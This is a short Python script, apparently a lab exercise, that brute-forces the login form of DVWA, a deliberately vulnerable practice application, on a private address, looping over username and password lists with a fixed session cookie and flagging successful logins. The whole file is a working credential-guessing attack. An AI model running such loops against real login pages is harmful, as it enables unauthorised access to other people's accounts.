import requests

header={"Cookie": "security=high;" "PHPSESSID=775bcbf8d0c8b53c1ed836552d821b6e"}

username_list=["admin","password"]
password_list=["admin","password"]

for username in username_list:
    for password in password_list:
        url= "http://192.168.56.101/dvwa/vulnerabilities/brute/?username="+username+"&password="+password+"&Login=Login"
        sonuc=requests.get(url=url,headers=header)
        print("ID : ",username)
        print("Password : ",password)
        print("Sonuç Kodu : ",sonuc.status_code)

        if not "Username and/or password incorrect." in str(sonuc.content):
            print("Giriş başarılı.....")
        print("*"*20)